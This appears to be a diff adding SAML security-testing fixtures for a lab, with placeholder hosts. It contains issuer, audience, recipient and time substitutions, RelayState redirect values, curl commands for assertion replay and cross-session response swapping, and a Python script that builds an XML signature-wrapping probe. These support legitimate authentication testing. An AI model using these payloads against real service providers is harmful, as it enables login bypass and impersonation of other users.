@@ -1,0 +1,71 @@
+# SAML Vulnerability Testing Payloads
+# Authorized lab fixtures only. These are XML element/attribute replacements, not signed tokens.
+# Claim-validation tests require re-signing with a trusted lab IdP; signature tampering is a separate control.
+
+# Unsigned assertion negative control
+<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_saml_unsigned_probe" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"><saml:Issuer>https://idp.example.test/metadata</saml:Issuer><saml:Subject><saml:NameID>saml-user-b@example.test</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData Recipient="https://sp.example.test/acs" InResponseTo="_saml_request_a" NotOnOrAfter="2099-01-01T00:00:00Z"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"><saml:AudienceRestriction><saml:Audience>https://sp.example.test/entity</saml:Audience></saml:AudienceRestriction></saml:Conditions></saml:Assertion>
+
+# Issuer substitutions
+<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://untrusted-idp.example.test/metadata</saml:Issuer>
+<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"></saml:Issuer>
+
+# Audience replacements: reject a different service provider or a lookalike identifier
+<saml:Audience xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://other-sp.example.test/entity</saml:Audience>
+<saml:Audience xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://sp.example.test.entity.untrusted.test/</saml:Audience>
+
+# Destination / recipient attribute substitutions in the captured Response or SubjectConfirmationData
+Destination="https://other-sp.example.test/acs"
+Destination="https://sp.example.test/acs/extra"
+Recipient="https://other-sp.example.test/acs"
+Recipient="http://sp.example.test/acs"
+
+# Request binding: reject an unknown request ID; absent binding is policy-dependent for IdP-initiated SSO
+InResponseTo="_saml_unknown_request"
+InResponseTo="_saml_other_browser_request"
+
+# Time validation: fixed historical / future negative controls; adjust the baseline to current lab time
+NotOnOrAfter="2000-01-01T00:00:00Z"
+NotBefore="2099-01-01T00:00:00Z"
+SessionNotOnOrAfter="2000-01-01T00:00:00Z"
+
+<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">saml-user-b@example.test</saml:NameID>
+<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">saml-user-b-persistent</saml:NameID>
+
+# KeyInfo fragment is a placeholder; substitute a complete test certificate, never a private key.
+<ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:X509Data><ds:X509Certificate>LAB_UNTRUSTED_CERTIFICATE_BASE64</ds:X509Certificate></ds:X509Data></ds:KeyInfo>
+
+URI="#saml_nonexistent_assertion"
+URI=""
+URI="https://untrusted-idp.example.test/assertion.xml"
+
+# Authentication context / confirmation method replacements
+<saml:AuthnContextClassRef xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
+Method="urn:oasis:names:tc:SAML:2.0:cm:sender-vouches"
+
+# RelayState form fields: validate allowed local destinations independently of assertion validity
+RelayState=https%3A%2F%2Funtrusted.example.test%2Fsaml-return
+RelayState=%2F%2Funtrusted.example.test%2Fsaml-return
+RelayState=%2Faccount%2Fsaml-review
+
+# Assertion replay: run twice unchanged with a captured lab response
+curl -sS 'https://sp.example.test/acs' --data-urlencode 'SAMLResponse=LAB_CAPTURED_RESPONSE_BASE64' --data-urlencode 'RelayState=saml-replay-test'
+
+# Cross-session response swap: use browser B's test cookie and browser A's response
+curl -sS 'https://sp.example.test/acs' -H 'Cookie: saml_lab=LAB_BROWSER_B_SESSION' --data-urlencode 'SAMLResponse=LAB_BROWSER_A_RESPONSE_BASE64'
+
+# Wrapping generator: lxml, captured signed response in saml-response.xml; writes test XML only
+from copy import deepcopy
+from lxml import etree
+saml_parser = etree.XMLParser(resolve_entities=False, no_network=True)
+saml_tree = etree.parse('saml-response.xml', saml_parser)
+saml_root = saml_tree.getroot()
+saml_ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds': 'http://www.w3.org/2000/09/xmldsig#'}
+saml_signed = saml_root.find('saml:Assertion', saml_ns)
+saml_unsigned = deepcopy(saml_signed)
+for saml_signature in saml_unsigned.findall('ds:Signature', saml_ns):
+    saml_unsigned.remove(saml_signature)
+saml_unsigned.set('ID', '_saml_unsigned_wrapped')
+saml_unsigned.find('saml:Subject/saml:NameID', saml_ns).text = 'saml-user-b@example.test'
+saml_root.insert(0, saml_unsigned)
+saml_tree.write('saml-wrapping-probe.xml', encoding='UTF-8', xml_declaration=True)
+# Confirm retained signature validity in the lab; wrapping behavior depends on XML canonicalization.
